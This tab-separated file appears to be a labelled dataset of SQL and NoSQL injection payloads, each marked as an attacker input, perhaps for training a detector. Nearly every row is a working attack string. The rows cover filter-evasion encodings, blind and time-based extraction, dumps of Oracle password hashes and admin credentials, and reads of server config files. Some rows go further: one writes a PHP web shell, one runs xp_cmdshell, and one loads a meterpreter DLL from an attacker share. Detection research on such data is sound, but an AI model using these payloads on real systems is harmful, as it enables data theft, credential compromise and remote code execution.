Payload	Attacker
where id=.1union/*.1*/select@1	1
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '	1
select * from(user);	1
select * from`user`;	1
SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))	1
' or --+2=- -!!!'2	1
SELECT * FROM (SELECT * FROM user A JOIN user B USING (Host,User)) C;	1
' or 'a' = n'a # unicode	1
' and substr(data,1,1) = 0x61# 0x6162	1
' and substr(data,1,1) = unhex(61)# unhex(6162)	1
' and substr(data,1,1) = lower(conv(11,10,36))# 'b'	1
' and substr(data,1,1) = lower(conv(36,10,36))# 'z'	1
' and substr(data,1,1) = 'a'#	1
' and substring(data,1,1) = 'a'#	1
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'	1
rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'	1
insert(insert(version(),1,0,space(0)),2,222,space(0))	1
1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1	1
length(replace(data, 'a', '')) # length will be shorter	1
foo'div count(select`pass`from(users)where mid(pass,1,1)rlike\nlower(conv(10,pi()*pi(),pi()*pi())) )-'0	1
false !pi() 0 ceil(pi()*pi()) 10 ceil((pi()+pi())*pi()) 20	1
true !!pi() 1 ceil(pi()*pi())+true 11 ceil(ceil(pi())*version()) 21	1
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 ceil(pi())*ceil(version()) 24	1
floor(version()) 5 ceil(pi()*pi()+version()) 15 floor(pi()*(version()+pi())) 25	1
floor(version()+pi()) 8 ceil(pi()*version())+true 18 ceil(pi()*pi()*pi()-pi()) 28	1
floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 floor(pi()*pi()*floor(pi())) 29	1
true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M	1
floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N	1
ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q	1
ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R	1
?act=buy&id=1%0AAND 1=user	1
?did=2%0Aand/**/(select%0Auser())=”	1
?query=1' || if(ascii(substr((/*!select*/ */*a!*/from test.flag),1,1))=97,1,0)%23	1
/?id=123/*\~500001/*/union/*\~500001/*/select/*\~500001/*/1,2,3	1
?spm=5176.100241.0.0.eViKRY?id=1%20union%23%0Aselect%20user%20from%20ddd	1
?id=1'0x00and0x00select0x00*0x00from0x00	1
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#	1
id=union /*!50001select*/ * from ddd	1
inject_string=--%00%27+union%20select%20GROUP_CONCAT(DISTINCT%20table_name)%20from%20information_schema.tables%20where%20table_schema=0x73716C6F6C%23+&sanitize_quotes=none&blacklist_level=none&blacklist_keywords=&query_results=all_rows&error_level=verbose&location=where_string&submit=%D7%A2%C9%E4%21	1
id=%20--%20%27%20union%20select%201,2%20from%20users%23	1
id='select xx /*from*/``%23	1
id=/*%27%20union%20select%201,2,3,4%20from%20admin%23*/	1
99999=(select 1 as '/*') union all select 1 as '*//*',2,3,4,5 from mysql.user as `x*/`%23	1
".and 1=(select ""/*"") union all select 1,@@version,3,4,5 from mysql.user-- */"	1
.and 0=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--	1
.and 0=(select top 1 1 as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]	1
xxx'and'a'=(select '/*' from dual) union all select 1,2,3 from dual where '*/'='*/'	1
99999=(select 1 as '--+') union all select 1,2,3,4,5 from mysql.user%23	1
/*--+/*x/*/union all select 1,@@version,@@datadir,4,5 from mysql.user%23	1
99999=(select{`--+`1}) union all select 1,2,3,4,5 from mysql.user%23	1
xxx'and'1'=(select '-- ') union all select 1,2,3	1
xxx'%2b'--+'union all select 1,2,3	1
".and 0=(select 1 as ""--+"") union all select 1,2,3 from dual--"	1
and'a'=(select '--+' from dual) union all select 1,2,3,4,5 from dual--	1
id=/*!SELECT*//*!CONCAT*/(0x7176626a71,(MID((/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),0x20)),1,50)),0x7170767871)	1
id=/**//**/union/**//**/%0A/*!SeLEct*/%0A/**/*/**//*!From*/%0A/**/user	1
union select (select{x user}from{1d admin}+limit+1),1	1
1' and if(ascii(substr((select{1d user()}),1,1))>11,sleep(1),1)	1
%26%261=1	1
%26%261=0	1
extractvalue(floor(0),concat(0x0a,version()))	1
extractvalue(rand(0),concat(0x0a,unhex(hex(user()))))	1
updatexml(1,repeat(user(),2),1)	1
updatexml(0,concat(0xa,user()),0)	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select passwordxxxxfromxxxadmin limit 1)))%23	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select password from%a0admin limit 1)))%23	1
select{x%0acomment}from{x%0aguestbook}limit 1	1
id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,2,3,4,5,6,7,8,9,10	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select{x pwd}from{x %23@__admin}+limit+1)))%23	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update (select(select{x pwd}from{x %23@__admin}+limit+1)))%23	1
sql=select%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2a%20from%20manager	1
id=08Eunion select	1
id=8E0union/*.1*/select{x user}from{x users}%23	1
d=1 union/*.1*/select user from%a0admin%23	1
id=49 %u0061nd 1=2 un%u0069on se%u006c%u0065ct 1,2,3,4,5 from admin	1
/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..	1
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -	1
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -	1
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table	1
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table	1
/*!%55nion*/%20/*!%53elect*/%201,2,3	1
/*!%55nion*/%20/*!%53elect*/%201,2,3,4	1
/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7	1
/*!12345%55nion*/ /*!12345%53elect*/ 1	1
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4	1
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5	1
/*!12345%55nion*/(/*!12345%53elect*/ 1)	1
/*!12345%55nion*/(/*!12345%53elect*/ 1,2)	1
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)	1
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)	1
gRoUp_cOnCAt()	1
group_concat(/*!*/)	1
/*!group_concat*/(/*!12345table_name*/)	1
/*!group_concat*/(/*!50000table_name*/)	1
/*!GrOuP_ConCaT*/()	1
/*!12345GroUP_ConCat*/()	1
"+AND+mod(29,9)+div+@a:=(/*!50000concat(database/**_**/(),""--"",""_Y000!_"")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,@a,5,6,7+--+"	1
SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()	1
SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables	1
SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables	1
1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--	1
reverse(right(reverse(data),1))	1
(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)	1
CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))	1
/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))	1
/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+	1
/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+	1
select JSON_OBJECT(1, @@version)	1
select json_arrayagg('_Y000!_')	1
/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+	1
+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+	1
%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)	1
%75nion/**)!*/sele%63%74/**)!*/+1,2,3....	1
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--	1
+/*!50000union%23%0Aselect*/+1,2...+--+-	1
+/*!50000uNiOn*/(/*!50000SeLeCt*/+11,22,33....)+--+-	1
select session_user from sysibm.sysdummy1;	1
select system_user from sysibm.sysdummy1;	1
select grantee from syscat.dbauth;	1
select * from syscat.tabauth;	1
select name, tbname, coltype from sysibm.syscolumns;	1
SELECT schemaname FROM syscat.schemata;	1
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i	1
true, $where: '1 == 1'	1
, $where: '1 == 1'	1
1, $where: '1 == 1'	1
{ $ne: 1 }	1
db.injection.insert({success:1});	1
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1	1
' && this.passwordzz.match(/.*/)//+%00	1
'%20%26%26%20this.password.match(/.*/)//+%00	1
[$ne]=1	1
';sleep(5000);	1
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);	1
concat_ws('<br>','zet',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))	1
concat(@c:=0x00,if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)	1
concat%0b(@c:=0x00,if((select%20count(*)%20from%20/*!50000information_schema*/.columns%20/*!50000where*/%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat%0b(@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)	1
(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b),%200x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+if%20null(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)	1
+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+	1
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)	1
(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))	1
concat (0x3c623e44756d7020696e204f6e652053686f743c2f623e,0x3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),@c:=0x00,if((select count(*) from /*!50000information_schema*/.columns /*!50000where*/ table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat (@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)	1
\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#	1
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#	1
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#	1
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))	1
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))	1
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)	1
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata	1
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...	1
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;	1
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--	1
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--	1
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--	1
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--	1
?id=1 and substring(version(),1,1)=5	1
?id=1 and right(left(version(),1),1)=5	1
?id=1 and (select mid(version(),1,1)=4)	1
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'	1
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)	1
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)	1
'%2Bbenchmark(3200,SHA1(1))%2B'	1
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1	1
1 and (select sleep(10) from dual where database() like '%')#	1
1 and (select sleep(10) from dual where database() like '___')# 	1
1 and (select sleep(10) from dual where database() like 'a____')#	1
1 and (select sleep(10) from dual where database() like 's____')#	1
1 and (select sleep(10) from dual where database() like 'swa__')#	1
1 and (select sleep(10) from dual where database() like 'swb__')#	1
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --	1
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --	1
/foo/?theName=YAP&idNumber=248001'+AND+'2'='1 FALSE 	1
/foo/?theName=YAP&idNumber=248'||'001 TRUE	1
/foo/?theName=YAP&idNumber=24800'||rownum||'	1
SELECT * FROM dba_sy­s_privs WHERE grantee = ‘DBSNMP’;	1
SELECT name FROM v$data­base;	1
SELECT instan­ce_name FROM v$inst­ance;	1
‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — -	1
‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — -	1
1,**concat(**login,0x3a,password**)**,3,4 from users	1
‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — -	1
‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — -	1
?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’	1
**/*!**order***/+/***!by***/	1
**/*!**ORDER BY***/**	1
/*!12345**ORDER***/+/*!**BY***/**	1
BEGIN IF condition THEN tru-part; ELSE false-part; END IF; END; (O) IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;	1
param=' or 1=0 UniOn selEct id,null,null FroM public.info#	1
param=' or 1=0 un/**/ion sele/**/ct id,null,null fr/**/om public.info#	1
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--	1
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--	1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1	1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1	1
select query_to_xml('select * from pg_user',true,true,'');	1
select database_to_xml(true,true,'');	1
' and substr(version(),1,10) = 'PostgreXXX' and '1	1
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))	1
select pg_read_file('PG_VERSION', 0, 200);	1
SELECT CHR(65)||CHR(66)||CHR(67);	1
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table	1
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number	1
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--	1
ProductID=1;waitfor delay '0:0:10'--	1
ProductID=1');waitfor delay '0:0:10'--	1
ProductID=1));waitfor delay '0:0:10'--	1
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';	1
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';	1
% 2555nIoN% 28% 2553EleCt% 2B1% 29	1
% 252555nIoN% 2528% 252553EleCt% 252B1% 2529	1
